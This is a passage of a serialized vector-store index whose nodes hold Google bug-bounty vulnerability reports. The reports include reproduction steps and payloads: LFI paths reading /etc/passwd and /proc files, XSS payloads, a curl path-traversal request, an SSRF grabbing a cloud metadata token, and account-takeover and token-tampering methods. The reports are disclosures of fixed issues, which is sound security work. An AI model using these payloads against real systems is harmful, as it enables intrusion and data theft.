attack is only performed once and the attacked developer won't get suspicious.\r\nAcquisition info:\r\nFabric + Firebase - longer than 6 Months ago - see\r\nhttps://fabric.io/blog/2017/10/31/fabric-firebase-now-stronger-together/\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2950, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "40fb89f1-9306-4dda-b641-41d5e89e57ad": {"__data__": {"id_": "40fb89f1-9306-4dda-b641-41d5e89e57ad", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_437848.txt", "file_name": "20250408_175733_437848.txt", "file_type": "text/plain", "file_size": 898, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "057af806-ded4-4385-b535-eebd2b75b0dc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_437848.txt", "file_name": "20250408_175733_437848.txt", "file_type": "text/plain", "file_size": 898, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0f3437ba138b458351b4637ab372965139127b498742394f6bf7afd8b84d3ff3", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://docs.google.com/forms\r\nReported by:\r\nmax\r\nGoogle VRP\r\naccepted\r\n06:05 | Jul 21, 2018\r\nfixed\r\n22:59 | Aug 22, 2018\r\ntriaged\r\n17:59 | Dec 7, 2018\r\naccepted\r\n17:59 | Dec 7, 2018\r\nfixed\r\n17:59 | Dec 7, 2018\r\ntriaged\r\n23:52 | Dec 10, 2018\r\naccepted\r\n23:52 | Dec 10, 2018\r\nfixed\r\n11:22 | Apr 11, 2019\r\nreward decided\r\n$1,000\r\nSummary: You can see information that has already been deleted and is not available.\r\nGo to:\r\nhttps://goo.gl/forms/PaEqkgairdXSNNnq2\r\nYou will see that the Form is closed\r\nWe can see what's already deleted\r\nView the source of the page\r\nhttps://drive.google.com/open?id=1JAcmZz1a-8mYv9uOQxxXGLCWgcjSgEMF\r\nAttack scenario:\r\nYou can see information that has already been deleted and is not available.\r\nI would not want anyone to see what this form was after removing the form.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 882, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2ee1224f-c309-40de-8464-3bb4e5749008": {"__data__": {"id_": "2ee1224f-c309-40de-8464-3bb4e5749008", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_469365.txt", "file_name": "20250408_175733_469365.txt", "file_type": "text/plain", "file_size": 2937, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "738715f8-1aff-4a43-b245-007bb56d0338", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_469365.txt", "file_name": "20250408_175733_469365.txt", "file_type": "text/plain", "file_size": 2937, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "dc0c065710d11d752837a23e3c2ce48d0936b3532b154be093d7d460ff0872b9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://peering.google.com/\r\nReported by:\r\nJafar Abo Nada\r\nGoogle VRP\r\naccepted\r\n17:36 | Jun 22, 2018\r\nfixed\r\n18:47 | Jul 4, 2018\r\nreward decided\r\n$3,133.70\r\nSummary: Local File Inclusion 'LFI' Vulnerability\r\nHi Google!\r\nI found an Local File Inclusion 'LFI' Vulnerability in \"Google's Edge Network\".\r\nSteps to reproduce:\r\nGo to \"\r\nhttps://peering.google.com/\"\r\n.\r\nOpen any picture in another window for example: \"\r\nhttps://peering.google.com/static/images/couch-ipad.png\"\r\n.\r\nAdd one of this value at the end of the link: (\"../../../../../../../etc/passwd\") OR (\"../../../../../../../proc/self/cmdline\") OR (\"../../../../../../../proc/self/stat\") OR \r\n(\"../../../../../../../proc/self/status\").\r\nIn this way: \"\r\nhttps://peering.google.com/static/images/couch-ipad.png../../../../../../../proc/self/cmdline\"\r\n.\r\nNow you are viewing sensitive information about the server.\r\nPoC Video: \"\r\nhttps://www.youtube.com/watch?v=4QNSqiG53oU\"\r\nBrowser/OS: Firefox/Chrome (windows 10).\r\nAttack scenario:\r\nImpacts of an Exploited Local File Inclusion Vulnerability\r\nAs it is known, the impacts of exploiting a Local File Inclusion (LFI) vulnerability vary from information disclosure to complete compromise of the system. Even in cases where the included code is not executed, it can still give an attacker enough valuable information to be able to compromise the system,As is the case of the security vulnerability we are reporting\r\nThe attacker gets information about the server and Kernel data. # (PoC: \"/proc/version\" OR \"/proc/cpuinfo\" OR \"proc/meminfo\")\r\nExample leak data: \"Linux version 3.11.10 #1 SMP\"\r\nThe attacker gets information about the files on the server. # (PoC:\"proc/self/cmdline\")\r\nExample leak data: \"server_software=Google App Engine/1.9.69\"\r\nThe attacker gets information about the internal network. # (PoC:\"proc/self/cmdline\")\r\nExample leak data:\"apihost_address=169.254.169.253:4 /server_address=169.254.8.2:5\"\r\nThe attacker gets information about the operations and the time they run on the server. # (PoC:  \"proc/self/stat\")\r\nExample leak data: \"(python27g_runti)\"\r\nThe attacker gets sensitive information about the operation processes and the ability of the system that can contribute well in measuring the size of denial of service attacks. # (PoC: \"proc/self/status\").\r\nExample leak data: \"FDSize: 11,  VmSize: 1134532 kB,  VmRSS: 134860 kB, Threads: 17\"\r\nThe attacker gets statistics about the system and its files. # (PoC: \"/proc/self/io\").\r\nExample leak data: \"char: 3696441 wchar: 6431 syscr: 901 syscw: 53\"\r\nPoC Video: \"\r\nhttps://www.youtube.com/watch?v=4QNSqiG53oU\"\r\nAs you know a lot of commands that can be implemented and reviewed by attackers as long as the web server receives these requests and responds to them there will be more data leaks, and this poses a threat to the server.\r\nBest Regards\r\nJafar Abu Nada\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2921, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "38ee6eee-c9e0-4c90-af95-0cff38953c59": {"__data__": {"id_": "38ee6eee-c9e0-4c90-af95-0cff38953c59", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_566691.txt", "file_name": "20250408_175735_566691.txt", "file_type": "text/plain", "file_size": 957, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cfd969b8-282d-4345-bb68-4aba75a850c9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_566691.txt", "file_name": "20250408_175735_566691.txt", "file_type": "text/plain", "file_size": 957, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "633555a468f7608a7e663544e03c45792bb2109e93f5739a975693d620380013", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://scholar.google.com/citations?view_op=manage_labels\r\nReported by:\r\nSjoerd Bouber\r\nGoogle VRP\r\naccepted\r\n18:45 | Apr 3, 2018\r\nfixed\r\n12:59 | Jul 26, 2018\r\nreward decided\r\n$3,133.70\r\nReflected XSS on\r\nhttps://scholar.google.com/citations?view_op=manage_labels\r\nThe param u in the hash is an url, content is grabbed from this url and displayed in a dialog.\r\nXSS is possible because we can set this to a data url with an XSS payload.\r\nThe payload fires on the origin scholar.google.com\r\nSteps to reproduce:\r\nLogin to a Google account\r\nVisit:\r\nhttps://scholar.google.com/citations?view_op=manage_labels&hl=en&oi=srp#d=gs_md_nlbl-d&p=&u=data%3Atext%2Fhtml%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWphdmFzY3JpcHQ6cHJvbXB0KGRvY3VtZW50LmRvbWFpbik%2B\r\nBrowser/OS: \r\nChrome / Chrome OS\r\nAttack scenario:\r\nAn attacker can change the scholar profile/settings of the victim.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 941, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f9ed3535-0133-4181-8cf8-81bd3cef9560": {"__data__": {"id_": "f9ed3535-0133-4181-8cf8-81bd3cef9560", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_606831.txt", "file_name": "20250408_175735_606831.txt", "file_type": "text/plain", "file_size": 973, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "43860f7f-ccb0-4ab3-b118-69cbf9b32609", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_606831.txt", "file_name": "20250408_175735_606831.txt", "file_type": "text/plain", "file_size": 973, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6c97e33ca0a77e4fecbebafe6ebe02b7830ceae6c652185a61904444375fbcc2", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Stored XSS in kaggle.com\r\nReported by:\r\nArmaan Pathan\r\nGoogle VRP\r\naccepted\r\n21:17 | Mar 21, 2018\r\ntriaged\r\n19:26 | Mar 27, 2018\r\naccepted\r\n17:54 | Apr 3, 2018\r\nfixed\r\n03:48 | Apr 5, 2018\r\ntriaged\r\n22:47 | Apr 5, 2018\r\naccepted\r\n16:33 | Apr 6, 2018\r\nfixed\r\n22:59 | Aug 22, 2018\r\nreward decided\r\n$200\r\nSummary: Stored Cross Site Scripting attack\r\nSteps to reproduce:\r\nLogin into kaggle.com\r\ngo to my profile\r\nclick on edit profile\r\nenter \" + alert(document.domain), // payload in display name field and click on save profile.\r\nReload the page and payload will execute.\r\nPlease go through the PoC video to understand the attack\r\nhttps://drive.google.com/file/d/1KQXIuSu1FPDMBQ38NQ9Hj0QmsBVQmuCc/view?usp=sharing\r\nAttack scenario:\r\nwith the help of this attack, an attacker can steal cookies, record keylogs and can also capture screen.\r\nAcquisition info:\r\nhttps://www.kaggle.com\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 957, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8ddabb70-72bb-4ec5-a93d-c61b82700dce": {"__data__": {"id_": "8ddabb70-72bb-4ec5-a93d-c61b82700dce", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_647466.txt", "file_name": "20250408_175735_647466.txt", "file_type": "text/plain", "file_size": 1028, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d8c9c662-c563-49af-b3c8-51c6634d6511", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_647466.txt", "file_name": "20250408_175735_647466.txt", "file_type": "text/plain", "file_size": 1028, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c1370ae7c64ae952ce05906651f9286897e769b837061fa0ad7a9e1460929c8d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in www.bitium.com\r\nReported by:\r\nSunil Bhati\r\nGoogle VRP\r\naccepted\r\n01:45 | Jan 18, 2018\r\nfixed\r\n03:36 | Feb 21, 2018\r\nGoogle comment\r\nThis issue was not rewarded, as it was reported during the\r\n6-month blackout period\r\nthat applies to recent acquisitions.\r\nSummary: changing the user id, I can see name of user and password length and other details.\r\nSteps to reproduce:\r\nJust go to \"\r\nhttps://www.bitium.com/2/users/sign_in\"\r\nand intercept the request using any intercepting proxy(i have used Burp Suite).\r\nSend the request to repeater and change the id here.\r\nThis will leak the details in response.\r\nBrowser/OS: All\r\nAttack scenario:\r\nBy changing the ID, i can see partial details of the clients, length of password, support email.\r\nAttacker can use this info for social engineering. Also if any API uses user id and or client name in any API to display info of client, he can use this info of users and id to see that also.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1012, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "49fdf6c2-cc37-4b53-9c6b-845c391e7d8f": {"__data__": {"id_": "49fdf6c2-cc37-4b53-9c6b-845c391e7d8f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_804230.clean.txt", "file_name": "20250408_175658_804230.clean.txt", "file_type": "text/plain", "file_size": 1221, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c6d23c29-e657-484b-bda8-84403ab08c41", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_804230.clean.txt", "file_name": "20250408_175658_804230.clean.txt", "file_type": "text/plain", "file_size": 1221, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9d27ec6650924341aeb38258a61f2bd1f9ad1e4910cd915441deec6c04aa723e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nNginx alias path traversal on HPC Toolkit dashboard\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/hpc-toolkit/raw/main/community/front-end/ofe/website/nginx.conf\r\nVulnerability type:\r\nFile Inclusion\r\nDetails\r\nWhile analysing some of HPC's ToolKit source-code, a front-end dashboard application was found. This application has a Docker image and some config files for deploying it.\r\nOne of those config files is the nginx.conf file, which has a popular nginx misconfiguration called Nginx Alias Traversal, which happens when a\r\nlocation\r\ndirective doesn't end with a trailing slash, but an\r\nalias\r\ndirective inside it does.\r\nHere's a sample of the vulnerable code on the repository:\r\nlocation /static {\r\nalias ../hpc-toolkit/community/front-end/website/static/;\r\n}\r\nThis vulnerability allows attackers to exfiltrate files of the webserver. Here's a Proof-of-Concept:\r\ncurl http://<HPC Toolkit URL>/static../website/settings.py\r\nAttack scenario\r\nAn attacker can exfiltrate files of the webserver, leaking the secret token was not possible yet because the .secret_key file resides two directory levels above, making accessing it through the path traversal not possible.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1221, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ff1784ea-6f4a-40c9-bc03-a16649772374": {"__data__": {"id_": "ff1784ea-6f4a-40c9-bc03-a16649772374", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_128222.clean.txt", "file_name": "20250408_175638_128222.clean.txt", "file_type": "text/plain", "file_size": 1712, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "383f4465-4635-495a-a0de-0baae9da88d6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_128222.clean.txt", "file_name": "20250408_175638_128222.clean.txt", "file_type": "text/plain", "file_size": 1712, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9e34c2488fb6c879009820824b350dada24bfb59d9e0890dba8dcf3be2428af8", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nAccount Takeover via Email Parameter Exploit on Waymo Careers Portal\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://careers.withwaymo.com/candidate-settings-page\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nThis report details a critical security vulnerability discovered on the Waymo Careers portal (\r\n). The vulnerability allows unauthorized access to any user account by manipulating the email parameter while leaving the name field blank. This issue poses significant risks including unauthorized data access, account manipulation, and potential identity theft.\r\nThe vulnerability is present on the Waymo Careers portal's candidate settings page. By inputting an email address and leaving the name field blank, an attacker can gain unauthorized access to the account associated with the entered email address.\r\nPoC:\r\ngo to\r\nenter the email you want to Takeover it\r\nLeave the name blank\r\nClick Continue\r\nWow, I was able to log into the account and also edit and see all the information\r\nsee the video:\r\nhttps://drive.google.com/file/d/1ga0gB7qrED5axp6lSqQS0OFNmqyAMLlb/view?usp=sharing\r\nAttack scenario\r\nHigh: Unauthorized access to user accounts can lead to significant data breaches and potential identity theft.\r\nReputation Damage: Exploitation of this vulnerability can severely damage Waymo's reputation and trust with its users.\r\nCompliance Issues: Violations of data protection regulations such as GDPR or CCPA\r\nImplement proper authentication checks to ensure that both the email and name fields are validated before granting access.\r\nUtilize multi-factor authentication (MFA) to enhance security for user accounts.\r\nRegularly audit and test authentication mechanisms to prevent similar vulnerabilities", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1712, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2cc8fd32-b84e-45ac-aeb0-de51bd92bf8f": {"__data__": {"id_": "2cc8fd32-b84e-45ac-aeb0-de51bd92bf8f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_942258.clean.txt", "file_name": "20250408_175721_942258.clean.txt", "file_type": "text/plain", "file_size": 1821, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "59ad1153-8337-49e3-a310-6d6e330319a1", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_942258.clean.txt", "file_name": "20250408_175721_942258.clean.txt", "file_type": "text/plain", "file_size": 1821, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "99bfda9bf603f02ef2699b609382385865f799df7e24268c29f35ff396fd526a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Can remove requirement to authenticate for autofill without authenticating\r\nSteps to reproduce:\r\nSet up an Android (this was tested on a Pixel 4a) phone with a Google Account that has some saved passwords for apps (Strava is used in this example).\r\nInstall an app that has a saved set of credentials in the Google account (e.g. Strava).\r\nEnable Auto-fill security by going to Settings -> System -> Languages and input -> Auto-fill service (under Advanced) -> the settings cog for Google -> Auto-fill Security, and enable the Credentials option under use biometrics. Go back once to 'save' this setting.\r\nOpen the app that we installed in Step 2 and try to autofill the credentials. You will be asked to authenticate, do not.\r\nRepeat the steps in Step 3 and disable the Credentials option under use biometrics. You will not be asked to authenticate and will be able to disable this setting successfully. Go back once to 'save' this setting.\r\nOpen the app again and try to autofill the credentials. You will not be asked to authenticate and will be able to sign in using the saved credentials.\r\nThis is a demo video which starts at Step 3:\r\nhttps://youtu.be/6793fdnv3DA\r\nBrowser/OS: This was tested on a Google Pixel 4a running the latest version of Android 11 in the UK, with build number RP1A.200720.010.\r\nAttack scenario:\r\nThis vulnerability gives the owner of the device a false sense of security - when they enable the requirement to authenticate when they use autofill they would reasonably expect that it could not be bypassed so easily. This setting is useless if it can be disabled so easily and without authenticating.\r\nA possible attack scenario would be if someone lent their phone to someone else, and the other person used the owner's credentials to sign in to their accounts without their knowledge.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1821, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0fc761f6-63f4-4d7f-859f-26f86f7af9f8": {"__data__": {"id_": "0fc761f6-63f4-4d7f-859f-26f86f7af9f8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_191146.clean.txt", "file_name": "20250408_175731_191146.clean.txt", "file_type": "text/plain", "file_size": 977, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "7653e2e3-0b9a-44e4-8746-2ab3e1b06dc1", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_191146.clean.txt", "file_name": "20250408_175731_191146.clean.txt", "file_type": "text/plain", "file_size": 977, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "0893f446beff6fcf89172a2ace869c310ec8a32c81a24bf7155523aada445539", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Waze Partner Data Leak\r\nSteps to reproduce:\r\nLogin to\r\nhttps://partnerdash.google.com/waze\r\nSave session data\r\nRequest\r\nhttps://partnerdash.google.com/waze/u/0/_json/_rpc/partnersvc/getPartnerList\r\nto get partner IDs\r\nUse partner ID in request to\r\nhttps://partnerdash.google.com/waze/u/0/_json/_rpc/partnersvc/getPartner\r\n(body {\"name\":\"wazepartners/VICTIMID\"})\r\nAttack scenario:\r\nA Google user can sign up for any of the Waze partner programs and even after rejection access the PartnerDash. This then allows them to use the RPC methods that are used by the web app. A user could retrieve a partner profile for a known partner and gain private data such as the partner's private contact info, address, private URLs and even Google employee emails since there are fields such as approverEmail that show the Google employee email. All of the gathered data can then be used in a spear phishing attack on the waze partner.\r\nAcquisition info:\r\nGoogle acquired waze in 2013", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 977, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "97c17499-ff91-4b46-a5c8-6663c5a798c2": {"__data__": {"id_": "97c17499-ff91-4b46-a5c8-6663c5a798c2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_827011.clean.txt", "file_name": "20250408_175728_827011.clean.txt", "file_type": "text/plain", "file_size": 628, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "58935546-cbf0-4623-a56b-f32f4682a619", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_827011.clean.txt", "file_name": "20250408_175728_827011.clean.txt", "file_type": "text/plain", "file_size": 628, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "7f53ba5d39a6c6229cb80608bf8e43a85934897e1e6572439971afead7f6121b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Metadata SSRF\r\nSteps to reproduce:\r\nEnter to\r\nhttps://caja.appspot.com/#http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\r\nClick \"Load\"\r\nNotify that you can obtained access token.\r\nBrowser/OS: Any\r\nAttack scenario:\r\nAny user can obtain \"/auth/cloud-platform\" scope. It means any user can get read/write access to the project's internal information, code, interesting data, etc.\r\nThe feature seems to be broken(For example, you can't load\r\nhttps://www.google.com\r\n), so I couldn't explore more. Can you check out whether other endpoint/hosts could be loaded when it's fixed?", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 628, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2996d677-d0fc-4724-85af-f68b10360900": {"__data__": {"id_": "2996d677-d0fc-4724-85af-f68b10360900", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_102846.clean.txt", "file_name": "20250408_175708_102846.clean.txt", "file_type": "text/plain", "file_size": 2138, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "bc0b990d-eb84-4a42-aea2-33bddd891e07", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_102846.clean.txt", "file_name": "20250408_175708_102846.clean.txt", "file_type": "text/plain", "file_size": 2138, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "31ac72f6c5b615483b21b90a7da9eb5ccff30a087c902f6e269fa62d6676d6d2", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nA bug in VirusTotal allows to sign up with an arbitrary email address, which results in access to a private enterprise VT group\r\nProduct:\r\nVirusTotal\r\nURL:\r\nhttps://www.virustotal.com/ui/signup/confirm\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nSign up with an arbitrary email address you don't have access to, for example:\r\nEmail:\r\nvictim@targetdomain.com\r\nUsername:\r\nvictim\r\nPassword:\r\nX#|>.Dl\\Ec^8joW#\r\nSign up with email address you have access to and with specially crafted username:\r\nyitadev549@jrvps.com\r\nvictim1\r\nFind account activation email was sent to\r\n, pay attention at the activation link:\r\nhttps://www.virustotal.com/gui/account-activation/dmljdGltMXx8MTY1Njc1NDMyN3x8MzM1MmRjNzMxMTE1ZTliOTkzZGIyODY3ZjIyOTg0MmUxOGUyNTI3YWFmNDQ1ZjViYzkxYThmMGVlZDRjNWIxYw\r\nBase64 decode string:\r\ndmljdGltMXx8MTY1Njc1NDMyN3x8MzM1MmRjNzMxMTE1ZTliOTkzZGIyODY3ZjIyOTg0MmUxOGUyNTI3YWFmNDQ1ZjViYzkxYThmMGVlZDRjNWIxYw\r\nvictim1||1656754327||3352dc731115e9b993db2867f229842e18e2527aaf445f5bc91a8f0eed4c5b1c\r\n.\r\nIt has format\r\nusername||timestamp||token\r\nTransform decoded string to\r\nvictim||11656754327||3352dc731115e9b993db2867f229842e18e2527aaf445f5bc91a8f0eed4c5b1c\r\nI moved\r\n1\r\nfrom username to timestamp. Encode it with Base64.\r\nOpen activation link with new tampered Base64 string in the 